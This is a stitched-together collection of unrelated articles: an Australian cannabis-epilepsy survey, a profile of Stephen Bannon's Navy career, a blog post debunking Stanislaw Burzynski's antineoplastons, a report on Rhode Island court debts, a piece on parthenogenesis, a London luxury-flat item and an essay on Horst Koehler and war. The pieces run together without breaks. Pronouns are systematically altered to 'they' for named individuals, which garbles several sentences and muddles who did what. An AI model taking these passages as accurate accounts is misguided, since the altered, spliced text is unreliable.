The lead author of the study, Anastatsia Suraeve from the Lambert Initiative, said researchers had gained further insight into the reasons that influence use.
“Despite the limitations of a retrospective online survey, we cannot ignore that a significant proportion of adults and children with epilepsy are using cannabis-based products in Australia, and many are self-reporting considerable benefits to their condition,” Suraeve said.
“More systematic clinical studies are urgently needed to help us better understand the role of cannabinoids in epilepsy,” they said.
In 2015, the grandparents of three-year-old girl with a rare form of epilepsy made a $33.7m donation to the Lambert Initiative to fund medicinal cannabis research.

It was just after midnight on March 21, 1980, when a Navy destroyer navigated by Stephen K. Bannon, a junior officer, met with the supercarrier USS Nimitz in the Gulf of Oman. The convoy headed near the Iranian coast, where a secret mission would be launched a month later to rescue 52 U.S. Embassy hostages held in Tehran.
Bannon's ship, the USS Paul F. Foster, trailed the Nimitz, which carried helicopters that would try to retrieve the hostages. But before the mission launched, Bannon's ship was ordered to sail to Pearl Harbor, and they learned while at sea that the rescue had failed. A U.S. helicopter crashed into another aircraft in the Iranian desert, killing eight service members and dooming the plan to liberate the hostages.
“I have the perfect word” for how the crew felt upon learning that the mission failed, said Andrew Green, one of Bannon's shipmates. “Defeated. We felt defeated.”
As Bannon has told it, the failed hostage rescue is one of the defining moments of their life, providing a searing example of failed military and presidential leadership — one that they carry with them as they serve as President Trump's chief strategist. They have said they aren't interested in politics until they concluded that then-President Jimmy Carter had undercut the Navy and blown the rescue mission.
Bannon, a former Goldman Sachs investment banker best known for their time as chairperson of the conservative website Breitbart, has become one of the most powerful figures in Washington as chief strategist for Trump. Moreover, in an unusual move for a political operative, Bannon secured a permanent seat on the National Security Council, giving them a voice in critical decisions on defense and foreign policy.
Bannon served seven years in the Navy, with two deployments at sea and then three years as an underling in a Pentagon office dealing with budgets and planning. White House press secretary Sean Spicer cited Bannon's naval service as justification for giving them a seat on the Security Council, saying during a Jan. 29 appearance on ABC's “This Week” that such service gave them “a tremendous understanding of the world and the geopolitical landscape that we have now.”
A review by The Washington Post of Bannon's naval career, based on interviews with more than 25 shipmates and an examination of deck logs stored at the National Archives, found that their service was steady but unremarkable. Bannon's naval service is the least-known part of their career, and many details have not been previously reported. The records show that their deployments never involved warfare, and the closest they came to conflict may have been their brief experience at the edge of the hostage-rescue fiasco.
This deck log from March 21, 1980, shows that Bannon's ship, the USS Paul F. Foster, linked up with the USS Nimitz a month before the failed hostage-rescue mission, and “Bannon assumed the deck.”
Still, the experience shaped their thinking. They saw the military buildup under President Ronald Reagan, and the hostage-taking in Tehran continues to inform their view about that region of the world, as well as the role of U.S. military power and its commander in chief.
In recent years, Bannon has spoken in apocalyptic terms about Islam. In 2007, they outlined a movie in which radical Muslims take over the United States and turn it into the “Islamic States of America.” In 2014, they delivered a talk in which they said, “We're now, I believe, at the beginning stages of a global war against Islamic fascism.”
Bannon declined to be interviewed.
As a White House official, Bannon played a key role in writing the executive order on immigration that targeted seven countries, including Iran. They have urged abandonment of the Obama administration's nuclear deal with Iran. Bannon's seat on the Security Council will continue to give them extraordinary power to influence the administration's policies.
Grueling duty, but no combat
Bannon, who grew up in a Democratic family in Richmond, signed up for the Naval Reserve in 1976, after graduating from Virginia Tech, and then arrived at age 24 at the Navy's training center in Rhode Island in 1977. The next year, they shipped out on the Foster, on which they would travel mostly in the Pacific and Indian oceans from 1978 to 1980, stopping at ports in countries such as the Philippines and Singapore. It was an anti-submarine destroyer whose mission was to trail aircraft carriers and keep them safe.
They were an ensign and then a lieutenant junior grade, assigned to a windowless, two-bed stateroom with desks and a wardrobe area, comfortable accommodation compared with the warren of bunks where most sailors slept.
Their first job gave them responsibility for engineering, including air conditioning, hydraulics and electronics. It was “all the inelegant work of the ship,” said Edward “Sonny” Masso, a retired rear admiral who served with Bannon. “Not just anybody succeeds in that job.”
Bannon later became a navigator, guiding the ship — at times with a sextant when the electronic system lost contact with satellites — and writing reports.
Not once during Bannon's deployments at sea was the ship involved in combat, but it was grueling duty, full of tedium and drills, according to shipmates and logs. At times, the Foster would play cat-and-mouse games with Soviet vessels, trailing and testing each other, shipmates said.
Scott Brubaker, an enlisted sailor who served with Bannon, said that experience “will change you forever. . . . You pull into Hong Kong and go to Victoria Peak. You go to Singapore. There are the smells, sometimes the stench, sometimes the abject poverty. . . . We learned we had a very big world, and one that certainly had its inherent risks.”

Bannon is remembered by many of their shipmates as a quiet, proficient and studious officer.
William Keating, who was Bannon's roommate for two years, called them “a good guy who did their job,” and they had no recollection of political discussion. The portrayal of Bannon today as a far-right nationalist “is not the individual that I knew,” Keating said.
On one occasion, Keating recalled, Bannon proudly brought their father aboard and gave up their bed so their father could sleep in the stateroom. “I remember the two of them together,” Keating said. “They had a really good father-son relationship.”
Some shipmates had more critical recollections of Bannon.
“He wasn't the best engineer we had, but they aren't bad. They were basically an above-average officer,” said Robin Mickle, a retired Navy captain.
Mickle said they did not get along personally with Bannon and found them “obnoxious” at times.
“His only problem was that they aren't in it for the long run. They never really wanted to stay. They told us it would look good on their résumé if they went into politics. The politics part didn't impress any of us.”
Bannon told Bloomberg Business Week in 2015 that “I wasn't political until I got into the service and saw how badly Jimmy Carter f---ed things up. I became a Reagan admirer.”
Greg Garrison, who served as an engineer on the Foster, said: “What I remember was they were kind of uppity; they didn't get along with enlisted men. They just kind of stuck their nose up at us.”
Bannon is remembered as much for their skill at sports as for their work on the ship's deck. When the Foster docked at ports around the world, the ship's basketball team often lined up games against local competition. Bannon's nickname was “Coast,” short for coast-to-coast, because on the basketball court he'd never pass the ball, Mickle said. Bannon also excelled at baseball, although shipmates ribbed them for being called out three times in one inning, recalled David Ziemba, who spoke warmly about their former roommate.
Bannon, meanwhile, scoured newspapers such as the Wall Street Journal for what turned out to be a lucrative sideline. They put money into commodities such as gold and silver, advising shipmates, Masso said, and presaging their career as an investment banker.
“He was like our investment sensei,” Masso said, referring to a teaching role.
‘A little bit of a hell-raiser'
Bannon's patrols became more tense after Iranians in 1979 took control of the U.S. Embassy in Tehran and seized hostages, and the streets filled with protesters chanting slogans such as “Death to America.” The Cold War still dominated military thinking, but military planners also put more emphasis on anti-terrorism measures.
The presidential campaign in the United States focused much attention on Iran's seizure of U.S. Embassy officials. Carter, a Democrat, was blasted by Republicans for allowing the hostage saga to have taken place. A nightly news program was called “America Held Hostage,” and Reagan, a Republican, vowed to strengthen the country's military.
Back on the Foster, crew members said they were aware of the growing tensions, and they were eager to be part of whatever action might come.
In late November 1979, however, the Foster's sonar dome — a crucial piece of equipment used for navigation and detection — was damaged. Bannon, in their role as navigator, wrote in the deck log: “Slow to 5 Kts to reduce damage to Sonar Dome.” The logs do not indicate what caused the damage, and no blame was assessed.
Traveling at about one-third of its normal speed in stormy seas — during which the Foster was hit with 20-foot-high waves — the vessel detoured to Guam for repairs.
Then, after nearly two months at Guam and weeks more of travel, Bannon's ship linked up on March 21, 1980, with the USS Nimitz. Three hours after the rendezvous, “Bannon assumed the deck” to help navigate, according to the logs of their ship.
The Nimitz, one of the world's largest supercarriers, already was involved in preparation for the hostage rescue mission. Ziemba, the Bannon roommate, noticed helicopters stored on the Nimitz that they later realized were to be used in the rescue mission.
Bannon's ship operated from an area called Gonzo station, according to deck logs that use the Navy shorthand for Gulf of Oman Naval Zone of Operations. Bannon's ship trailed the Nimitz around the gulf, part of which borders southern Iran. Then the Foster was ordered to sail to Pearl Harbor.
What happened next is unclear because all of the deck logs for April 1980 are missing from the National Archives. (Officials said that records for that month were not among the documents it originally received.) It was on April 24 that the rescue mission was launched and resulted in the eight deaths in the desert.
Larry Benson, an enlisted sailor who remembered Bannon as “a little bit of a hell-raiser,” said they were told later that the Foster would have played a further role in the rescue if the mission had been completed. “This was classified. A lot of people didn't know we were part of the process,” Benson said. But other sailors said they had no knowledge about that.
The deck logs resume on May 1, and they show that Bannon navigated as the Foster sailed from Pearl Harbor to San Diego.
Some of Bannon's shipmates recalled that the crew was given a ribbon for its modest role. But Bannon and many other crew members were livid at Carter for the botched rescue.
“It shattered their confidence in President Carter,” Masso said. “It made them all the more in the tank for Reagan.”
In October 1980, with the Foster in port at Long Beach, Bannon went to Masso's home to watch a Carter-Reagan debate. “He watched that debate like a prizefight,” Masso said.
Three months later, after Reagan won the election, Bannon was working for the new president, serving as an assistant in the office of the chief of naval operations at the Pentagon. They watched with satisfaction as Reagan increased the military budget and strengthened the Navy, with most of the focus on combating the Soviet Union. They served for three years and simultaneously studied national security and earned a master's degree at Georgetown University.

Peter Harris, who served with Bannon at the Pentagon and also was in the Georgetown program, recalled that Bannon persuaded them to join the Toastmasters program, which teaches public speaking. “We did a lot of briefings, and we wanted to polish our public speaking skills,” Harris said.
Harris said Bannon was “an excellent officer” and described their Pentagon duties as “being down the food chain quite a bit . . . but [we] were exposed to a lot. We were all very involved in the Navy budget, working with the senior admirals. It was a good time to understand how the Navy formulates its policies and looks at the force structure 20 years out.”
Patrick McKim, who also served with Bannon at the Pentagon and has remained a close friend and sometimes writes for Breitbart, said that the period is crucial to understanding Bannon's development. When Bannon arrived at the dawn of the Reagan era, McKim said, the military was still trying to emerge from the post-Vietnam era and the failed hostage rescue.
“People made you ashamed to be an officer,” McKim said in an interview arranged by a Bannon associate. Reagan's arrival and the military buildup changed that view, and Bannon idolized the new president. Two years before Bannon left the military in 1983 and headed to Harvard Business School, they told McKim that they had a vision of their future.
“He mentioned that he'd go to Harvard and come back and be secretary of defense,” McKim recalled.
Bannon did not get the top job at the Pentagon. But 34 years after revealing that ambition, Bannon's Navy career can be seen in a different light: It launched them on a path to Trump's side, which may prove to be an even more powerful position.

I forgot if I ever mentioned that I have an article out in the current episode of Skeptical Inquirer about Stanislaw Burzynski. I call it a "primer for skeptics," because that's what it is. So, if you subscribe to SI (Skeptical Inquirer, not Sports Illustrated), read. If not, get thee to a newsstand before it's gone. Thus endeth the plug and beginneth the Insolence.
When last I discussed Stanislaw Burzynski, I noted that, among other things, the state of Texas appears far more interested in putting abortion providers out of business than it does in protecting its citizens suffering from cancer from dangerous unproven chemotherapeutic agents, which is what Stanislaw Burzynski's antineoplastons are. Meanwhile, every pro-quackery propaganda organ has been firing on all cylinders trying to drum up public support for pressuring Congress to pressure the FDA to let Burzynski administer their antineoplastons are and always have been. That's not even including the fact that Burzynski uses lots of expensive targeted therapy along with chemotherapy as part of their incompetently administered "personalized gene-targeted cancer therapy," or, as I like to call it, making it up as you go along. Coupled with that, Burzynski and their minions have been cynically using desperate cancer patients as pawns in their propaganda effort, even recruiting a rock star to help out. Indeed, some of us who have been following Burzynski, myself included, suspect that Burzynski and/or their supporters have been influential in promoting the recent rash of so-called "right to try" bills being considered in multiple states.
So it's not surprising that one of Burzynski's oldest supporters, a man who was featured in the very first movie made by Stanislaw Burzynski's very own propagandist, Eric Merola, featured prominently, has published a resoundingly cranky defense of Stanislaw Burzynski. Unfortunately, they decided to do it what is arguably the number one "natural health" (translation: quackery) site on the Internet, Mercola.com. I'm referring to a man named Ric Schiff, who wrote a post for Mercola.com entitled Medical System and Child Protective Services Run Amok: FDA Denies Hope for Dying Kids, and Other Abuses Waged Against Families Struggling to Help Their Ailing Children.
Schiff, as you might recall, is a San Francisco police officer whose daughter died in the 1990s after Burzynski treated them for a brain tumor. However, they do not blame Burzynski for failing to save them or for harming them Rather, they blame the conventional therapy for their daughter's death, claiming that they might have lived if only they hadn't received chemoradiation before going to Burzynski and that Burzynski's treatment had rendered their tumor free, although they died of radiation damage to the brain. Of note, I pointed out how irrelevant their assertion that, because they are a police officer, they are trained to detect fraud and therefore when they say there is no fraud in Burzynski they should be believed. As I pointed out at the time, Mr. Schiff might be a perfectly fine police officer, but that has pretty darned close to no bearing on their ability to determine whether or not Burzynski is on the up and up, and it has no bearing whatsoever on their ability to assess whether or not it was Burzynski could have saved their daughter. While I find it hard to be harsh on anyone who's lost a child, I can't help but note that Schiff has been spreading the Good News about Burzynski since then. More recently, they were found to have a profound conflict of interest in that they were appointed to the board of directors of the Burzynski Research Institute while a few months ago they apparently are one of the founders of a group, the ANP Coalition, that's lobbying Congress either to change the law or to pressure the FDA to loosen up compassionate use exemptions. I've heard rumors that he's since resigned from the board of directors, but I don't have any evidence yet. If it's true, it would go to show that there actually do exist conflicts of interest so severe that even the Burzynski Research Institute can't tolerate them.
Be that as it may, Schiff is in fine fettle as they simultaneously attack the FDA for not appreciating what a genius (he believes) Burzynski is and, in their mind, killing children:
It is often argued that the most heinous crimes that can be committed in our society are those committed against children. Defenseless children, who rely on the greater values and morality of society to provide for their safety, their growth and development. But what happens when the government stands between parents and the possible cure for their child's terminal illness? Take the following case for example. (The full story of Braiden Norton can be found on their Website, www.BraidenNorton.com.)
I've discussed the Braiden Norton case before. As I pointed out at the time, by the parents' own story, Braiden had a 50% chance of survival with conventional treatment. Also at the time, I mused that I might one day have to take a closer look at this particular case. Unfortunately, Mr. Schiff has made it mandatory that I do so now. I'm sorry they did, but they did.
According to the the entry on the Burzynski Patient Group website and website devoted to Braiden:
Braiden was diagnosed with a Juevenile Pylocytic Astrocytoma brain tumor that is located on the top of their brainstem at the age of one. They immediately underwent a 13 hour partial tumor resection surgery. Months later they had a subderal shunt installed to maintain proper pressure in their ventricles. Regardless of the surgery, the tumor grew back to its original size. We were pitched chemotherapy which I would ultimately turn down and instead bring Braiden to the Burzynski Clinic in Houston, TX where they were qualified to join an FDA phase 2 genetic targeted treatment called Antineoplastons. Braiden remained on this treatment for four years and responded beautifully to treatment while experiencing nearly zero side effects. Braiden took a break from treatment in February of 2012 and has been completely free from any medication, showing signs of nothing short of vibrant health. However, a recent MRI in December 2013 showed signs of tumor growth. After having a extremely successful and professional experience with the Burzynski Clinic, it was a no-brainer that we continue Antineoplaston treatment. HOWEVER, to our surprise, the FDA is considering Braiden a 'new patient' therefore making the treatment completely inaccessible to them due to a convoluted 'administrative hold' they have placed on the Burzynski Clinic. How the FDA can declare my son a 'new patient' after being a proven success from Antineoplastons has our family and community flabbergasted.
The first thing that needs to be understood is that juvenile pylocytic astrocytoma is a rare pediatric brain tumor that, in most cases, is benign and slow-growing, and complete surgical resection can provide long term survival, or at least good quality of life for several years. Indeed, sometimes neurosurgeons will even delay surgery and choose watchful waiting, only intervening when the patient becomes more symptomatic. There is evidence in the literature that chemotherapy might be useful as an adjuvant in the case of an incomplete resection, which is what Braiden sounds like they had. Then, Braiden had an indolent course over five years, from 2008 to 2013, when their tumor apparently started growing again. On the website, we see two MRIs, represented as Braiden in 2008 and in 2012. Unfortunately they are difficult to interpret or compare because they are taken by very different techniques. It's also difficult to determine whether antineoplastons truly had any effect, given how indolent these tumors often are. In any case, if, as the parents relate, Braiden's tumor has started growing again, then there are still options, including an attempt at resecting it again, chemotherapy, and possibly radiation therapy, and, as has been pointed out elsewhere, even in the case of an incomplete resection, the ten year survival rate can be as high as 45%.
Once again, I have nothing but sympathy for parents with a child facing a life-threatening disease. However, there is no compelling evidence that Burzynski was responsible for Braiden's previous good fortune or that their treatment would reverse the most recent recurrence. There is nothing in their story that justifies Schiff's next rant. After proclaiming that the FDA "couldn't care less about your welfare or last chance at hope" (which, by the way, is not true; otherwise there wouldn't be a compassionate use protocol, also known as single patient IND), Schiff attacks:
The story of ANP brings to light some very interesting anomalies with respect to how cancer is dealt with in the US, both medically (called "standard of care"), and with respect to the FDA's new drug approval process. ANP is a self-infused anticancer agent that can be dispensed on an out-patient basis. When it is successful, the patient can continue to live a fairly normal life as side effects tend to be relatively benign and short term. This makes the treatment much more desirable over conventional treatments, which would certainly lead to economic misfortune for the cancer industry if patients knew and understood the difference between these two types of treatments. Instead of fast-tracking ANP for the good of all, the FDA seems bent on curtailing its use whenever possible.
And:
ANP offers a significant probability of survival to these patients and the FDA is well aware of that fact. Recently concluded ANP clinical trials showed ANP had greater efficacy for the treatment of brain tumors than all other clinical trials ever completed put together! But the FDA is demanding more. Under a compassionate request, it is established that there is no other treatment option. It is by definition a last ditch Hail Mary pass meant to save a life using an experimental (unapproved) treatment. There is virtually no legitimate argument for preventing these patients from receiving ANP because there is nothing that can be lost. They're already dying.
What Mr. Schiff fails to mention are two things. First, it is Burzynski's fault that the FDA is very resistant to permitting single patient INDs for their antineoplastons. They have utterly failed to publish evidence of efficacy and safety. Oh, sure, he's registered six dozen phase II clinical trials, but he's never published a completed trial, just a couple of preliminary reports and the occasional case study or small case series. If he's had such miraculous results, they should be able to publish. If antineoplastons are as active against brain cancer as Burzynski's patients believe, then they are profoundly irresponsible for not publishing. Of course, the real reason they don't publish is because antineoplastons almost certainly don't work, but if they did that would make Burzynski even more guilty of causing harm to patients than I believe them to be. Second, let's not forget that a young boy named Josia Cotto died of complications of Burzynski's treatment. That's why the FDA put a partial clinical hold on antineoplastons for children, to follow it up with a hold on adults as well. That's why Burzynski can't treat new patients, only patients already on antineoplastons. That's why the patients described by Schiff, most of whom I've discussed in detail before, can't have antineoplastons. Given the utter lack of convincing evidence that antineoplastons have significant anticancer activity in humans and the existing evidence for their causing severe hypernatremia, these patients are almost certainly better off. As I've said before, there's only one thing worse than dying of terminal cancer, and that's to suffer complications with no hope of benefit or even to have your precious remaining days shortened unnecessarily.
After Schiff's little tirade, Mercola jumps in and, amazingly, likens the FDA's partial clinical hold on antineoplastons to child abuse, while complaining about cases like that of Sarah Hershberger, in which the family of a 12-year-old Amish girl with leukemia refused further chemotherapy for her, an action that will almost certainly result in their death, unless they were lucky enough to be in the minority who achieve long term remission after induction chemotherapy and a dose or two of consolidation chemotherapy.
I don't know how much traction this latest round of Burzynski propaganda will get. After all, it's all mostly on quack websites. Unlike past propaganda efforts, Burzynski has had minimal access to mainstream sources, as they did in the 1990s and even as recently as a year ago. Right now, he's trying to rally the base, using mouthpieces like Ric Schiff.
It's a hidden cost of crime. The NBC 10 I-Team learned at least 18 percent of people sent to Rhode Island's ACI on any given day are arrested in connection with unpaid court costs, not because of a new crime.
NBC 10 began investigating the state's unpaid court costs in February, and learned criminals owe Rhode Island taxpayers more than $70 million.
But, the I-Team also learned that chasing that cash isn't always worth the cost. In some cases, Rhode Island taxpayers spend more to lock people up than those people ever owed.
Christopher Nemitz, an inmate at the ACI, sat down with the I-Team in March, just a few weeks before their release. Nemitz said they already owe more than $6,000 in court costs. They said their first priority once they get out is to find a job and start paying the bill.
"I should be able to pay it off," Nemitz said. "At $30 a month; it's going to take a while."
That's an understatement. At $30 a month, it will take them close to 17 years to settle up with the state.
Nemtiz reached out to NBC 10 after they saw the I-Team's original story, saying the entire system is out of whack. And numbers we found backed that up, showing Rhode Island's court costs are off the scale compared with the rest of New England.
"We charge almost double per felony what they do," Nemitz said.
A typical felony in Rhode Island costs at least $300, and that's per charge. So, if you're facing five separate charges in the same case, you could pay five times the fees, or $1,500. In some cases, a judge has discretion to waive or reduce fees after the first two charges. But, that is not always the case.
Massachusetts caps total court costs at five hundred dollars per case. In Connecticut, each felony costs just twenty dollars.
Then, there's the problem of people who owe a relatively small amount, but end up back in prison, arrested on warrants related to unpaid court costs.
"We heard really nightmarish stories of people caught up in an incredibly punitive collection process," said Nick Horton, who works with Open Doors, a Providence non-profit that advocates for former inmates.
Research in a 2008 study from Open Doors found that 18 percent of people jailed in Rhode Island on any given day are behind bars solely because they were arrested on warrants related to court costs.
"It is in essence a debtor's prison," Horton said.
The same study also found that 13 percent of people arrested in connection with court costs owed less than it cost taxpayers to lock them up. In one example, Horton said a man served 45 days at the ACI in connection with a $600 fine. The Department of Corrections said it costs about $100 a day to incarcerate someone at the Intake Center. That means taxpayers spent close to $5,000 to jail the man, more than eight times what they originally owed.
"Rarely are people incarcerated for not paying. People are incarcerated for not showing up," Horton said. "They don't come to court and a warrant is issued almost immediately."
What's so hard about just showing up? To make monthly hearings on their court costs in the past, Nemitz says he's had to take an entire day off work. That made it tough to hold down a job. With no income, they ended up on public assistance.
"I collected food stamps," Nemitz said. "I collected unemployment."
Many people also have tabs they may never be able to pay off. During just one day in Superior Court, the NBC 10 I-Team saw more than a hundred people on the calendar for court fees and fines. Most told Magistrate Patricia Harwood they simply had no way to pay. While Some were unemployed, others were homeless, or facing major medical problems.
"We talked to people who had served time in prison seven, 10, [or] 15 times for inability to pay on the same charge," Horton said.
NBC 10 asked court system spokesperson Craig Berke why Rhode Island's court costs are so much higher than neighboring states. The answer, they said, comes back to the State House.
"The legislature makes the policy decisions," Berke said. "It's our job in the judiciary to execute them as best we can, and that's what we try to do."
Other states give former inmates the option to use community service to pay their debt, with a judge's approval. For example, $10 of credit for every hour of work.
"I'm not saying that I have the answer," Nemitz said. "But, other states have found better ways to do it."
It's something they said could benefit inmates working to turn their lives around, and Rhode Island taxpayers, as well.

‘Tis the season for twinkling lights, wrapping paper, and virgin birth. For billions of Christians around the world, the holidays are a time to celebrate Jesus's birth to the Virgin Mary. But for many animals, virgin birth is far from a miraculous event. Researchers have discovered a growing number of species that reproduce without assistance from the opposite sex.
Known formally as parthenogenesis, virgin birth occurs when an embryo develops from an unfertilized egg cell. The development of an embryo usually requires genetic material from sperm and egg, as well as a series of chemical changes sparked by fertilization. In some parthenogenetic species, egg cells don't undergo meiosis, the typical halving of the cell's chromosomes, before dividing into new cells. These offspring are generally all female and clones of their mother. Other forms of parthenogenesis occur when two egg cells fuse after meiosis.
Biologists think that sexual reproduction evolved as a way to mix the gene pool and reduce the impact of harmful mutations. Still, parthenogenesis can be beneficial if the mother is particularly well adapted to their environment, since all of their offspring will be just as well adapted.
Here's a glimpse at some of the world's most recently discovered parthenogenetic species:

New Mexico whiptail (Aspidoscelis neomexicana)
Living in the deserts of the U.S. Southwest and parts of northern Mexico, the New Mexico whiptail is an all-female species of lizard. The creatures first arose as hybrids between two closely related species of sexually reproducing lizards: the little striped whiptail (A. inornata) and the tiger whiptail (A. tigris). Male hybrids aren't viable, making this one of the few all-female species. Adult female New Mexico whiptails reproduce solely through parthenogenesis, laying unfertilized eggs that develop into other female whiptails.

Komodo dragon (Varanus komodoensis)
In 2006, staff members at two zoos in the United Kingdom identified two female Komodo dragons that each laid an unusual clutch of eggs. The eggs developed into healthy offspring, even though neither female had been in recent contact with a male of that species. Genetic testing confirmed parthenogenesis. Although most Komodo dragons in the wild continue to reproduce sexually, this giant lizard is one of a growing number of vertebrates that reproduce parthenogenetically in captivity. Scientists still aren't sure what triggers the switch.

Freshwater water flea (Daphnia magna)
Found across North America and Eurasia, Daphnia species mostly reproduce by parthenogenesis. In the spring and summer, a female D. magna will let their all-female offspring partially mature in their abdominal brood pouch. After several molts, these females will produce their own offspring by parthenogenesis. The onset of winter, drought, or other environmental stress will trigger some of D. magna's developing parthenogenetic offspring to become males, who then mate with the parthenogenetic females. This method of sexual reproduction produces eggs with an extra shell layer that lets them survive the stressful period.

Bdelloid rotifers (Bdelloidea species)
Like the New Mexico whiptail, bdelloid rotifers are all female and reproduce entirely by parthenogenesis. Despite tens of millions of years of celibacy, these rotifers are an amazingly diverse group with more than 300 species. The animalsappear to offset a loss of genetic diversity by eating any DNA floating in their environment and incorporating it into their genome.

Marmorkrebs (marbled crayfish)
The parthenogenetic form of the North American crayfish Procambarus fallax, marmorkrebs are a popular aquarium pet. Their capacity for virgin birth was first discovered in Germany in 2003, when aquarium owners noticed that crayfish housed alone were laying eggs that developed into healthy adults. Genetic analysis and laboratory experiments confirmed that the animals were reproducing through parthenogenesis. Ecologists worry that their accidental release into the wild could seriously harm native crayfish, because a single individual can start a self-sustaining population, leading some states to prohibit their ownership.

Bonnethead shark (Sphyrna tiburo)
In 2001, a captive bonnethead shark (Sphyrna tiburo), a type of hammerhead shark (pictured), gave birth to a normal-appearing female offspring. When the pup died several days later, researchers discovered that the DNA of the pup was identical to its mother's. Because the mother had not been around any males for the previous 3 years, researchers confirmed that the pup developed through parthenogenesis.

Boa constrictor (Boa constrictor)
Until 2010, boas were thought to only reproduce sexually. But when a female boa produced several all-female litters that carried a rare genetic mutation, scientists from North Carolina State University in Raleigh performed a DNA fingerprint analysis. Although the genetic studies indicated that the female offspring were the result of parthenogenesis, researchers have yet to untangle the cellular factors that explain how and why this happened.

Development for ‘those who desire the best' on Palace Street in London due to be completed in 2018
A mystery buyer has paid £20m to be the Queen's next-door neighbour, snapping up a luxury flat overlooking Buckingham Palace. In a sign that the high-end London property market is as strong as ever, the buyer has forked out the cash before the developers have picked up a spade.
Northacre, the firm behind the project, said it hopes to attract “those who desire the best and who want a home in the heart of London”. And it expects some of the larger flats in the development, called 1 Palace Street, to command even higher price tags.
Abu Dhabi Financial Group, which owns 70% of Northacre, bought the site next to Buckingham Palace for £310m in 2013 and hopes to finish construction in 2018. It has been given planning consent for a 302,377 sq foot development, comprising 72 apartments and incorporating an existing Grade II listed building. If it can attract similar prices for all of the apartments, the group can expect to rake in more than £1bn from sales.
The proud new owners will be paying not just for the prestige of sharing a postcode with Queen Elizabeth II, but also for a range of upmarket bells and whistles. Owners will have access to underground parking and a communal “courtyard garden”, while they can also make use of a restaurant and full concierge service. Leisure facilities will include “one of the largest private pools in London”, as well as a spa, gym, cinema and library.
A spokesperson said the development would not include any affordable housing, but said Northacre made “an agreed financial contribution ... to support local affordable housing”. The spokesperson did not reveal the scale of the contribution.
The prices of homes valued at more than £5m have come under pressure this year, with figures from property investor Jones Lang LaSalle showing an 11.5% fall in the third quarter. The decline follows an increase in stamp duty levied on expensive homes, introduced by George Osborne in December.
“We are in a market that is rewarding quality, craftsmanship and a sense of authenticity,” said a spokesperson for Northacre. “Developments that do not address these key requirements of the high-end property buyer may need to reconsider their pricing.”
The Abu Dhabi investors behind Northacre also own New Scotland Yard, which has housed the Metropolitan police since 1967, after paying £370m for it last year. They plan to demolish the 1960s block in Victoria and build luxury apartments, although the familiar rotating sign that stands outside the building will remain.
For many, probably most, statesmen war is just another policy option. A government can apply diplomatic pressure. It can impose sanctions. It can launch a military attack.
The U.S. is a democracy and Americans like to think of themselves as setting a moral standard for the world. Yet since the end of the Cold War no country has more promiscuously used military force. Few of the conflicts presented even the barest claim of "defense" as justification. Most were simply wars of choice, used to advance one policy end or another.
American officials demonstrated a surprising lack of concern about the consequences of unleashing death and destruction upon other lands. The public tended to treat most wars, at least initially, like live video games,
But attitudes are different in the two nations which did the most to cause World War II and suffered the most as the conflict ground them underfoot. Pacifism remains particularly strong in Japan, the only country to suffer from the actual use of atomic bombs.
Military intervention remains controversial in Germany as well. Only recently has Berlin begun to deploy German troops overseas. Many Germans oppose giving NATO an "expeditionary" function.
In late May German President Horst Koehler visited Afghanistan, where they gave a radio interview in which they observed: "A country of our size, with its focus on exports and thus reliance on foreign trade, must be aware that... military deployments are necessary in an emergency to protect our interests -- for example, when it comes to trade routes, for example when it comes to preventing regional instabilities that could negatively influence our trade, jobs and incomes."
That comment would be unexceptional for an American politician to make. Secretary of State James Baker pointed to access to oil and protection of jobs as reasons to attack Iraq in the first Persian Gulf War. Many U.S. military interventions have had at least a partial economic justification.
But Koehler found out that Germany is not America. Criticism was sharp and spanned the political spectrum. They were accused of promoting "gun-boat diplomacy" and undermining the German constitution, which speaks only of defending Germany. Friendlier critics denounced their "awkward" rhetoric. The idea of Germans becoming "soldiers of international trade" did not go over well.
Under political siege Koehler complained that they were not shown the respect proper for a head of state and quit. The contretemps proved to be an extraordinary embarrassment for Chancellor Angela Merkel. They were a member of their party and they might lose the upcoming parliamentary vote to choose their successor.
Some Americans found the spectacle to be evidence of geopolitical immaturity. Journalist Clayton M. McCleskey complained: "Mr. Koehler found themselves isolated, a lonely leader attempting to push Germany to recognize the reality of its place in the world." Maybe, though it's entirely appropriate for citizens to demand that their leaders provide good reasons -- better than those typically offered in the U.S. -- for marching off to war.
In fact, America desperately needs a serious debate about when it should resort to war. Maintaining trade routes by protecting the freedom of the seas is a traditional national objective, but they normally are threatened only in broader conflicts, such as World Wars I and II. President Koehler claimed their comment on protecting trade routes referred to anti-piracy patrols near Somalia, but the latter don't compare to combat in Afghanistan.
Economics is a dubious justification for any war unless national survival is at stake. A country shouldn't start bombing other nations because it fears a modest spike in the unemployment rate or even a hefty rise in gasoline prices. Trade is good, but not good enough if it can only be conducted through war.
Anyway, economics has nothing to do with the Afghanistan conflict. To fight there in order to prevent Koehler's second concern, "regional instabilities that could negatively influence our trade, jobs and incomes," would make even less sense than normally comes out of the mouths of politicians.
Instability is a global reality. But instability in most countries and regions doesn't much matter to large and prosperous Western states. Instability in Afghanistan and elsewhere in Central Asia has little impact on the U.S. and Europe.
Certainly no Western nation is going to have to worry about its "trade, jobs and incomes" as a result of conflict in Afghanistan. That tragic nation has been roiled by war for decades. U.S. intervention in 2001 sparked another major flare-up of combat.
Even if America or its allies did worry about an adverse economic impact, that would not justify nearly nine years of war, with no end in sight. Interest is a necessary but not sufficient justification for war. There needs to be moral right as well as a reasonable chance of success.
The former was present with Washington's decision to defenestrate the Taliban regime after it hosted al-Qaeda. But it's impossible to justify coercive nation-building, which usually does more to promote than discourage terrorism, in the same way. Although there are plenty of dedicated Afghans seeking to build a decent society, the Karzai government rarely represents them. No matter how well the American military performs and the Afghan military is trained, people will have little reason to die for the Karzai government.
Thus, success looks increasingly improbable--at least at reasonable cost in reasonable time. The notion of sacrificing tens of thousands of lives, both allied and Afghan, and spending hundreds of billions of dollars in a supposed humanitarian crusade is dubious enough in theory. It is worse in practice.
At a meeting with U.S. personnel in Afghanistan, Gen. Stanley McChrystal recently acknowledged the problem of civilian deaths at checkpoints: "We've shot an amazing number of people and killed a number and, to my knowledge, none has proven to have been a real threat to the force." They added that they knew of no case when "we have engaged in an escalation of force incident and hurt someone has it turned out that the vehicle had a suicide bomb or weapons in it." This is a humanitarian conflict?
But to engage in all of this in order to protect "trade, jobs and incomes" would be particularly offensive, as the Germans realized. It should be considered outrageous even in America.
War is an ugly reality. As long as people are human we are unlikely to eliminate the practice. But we can reduce its incidence.
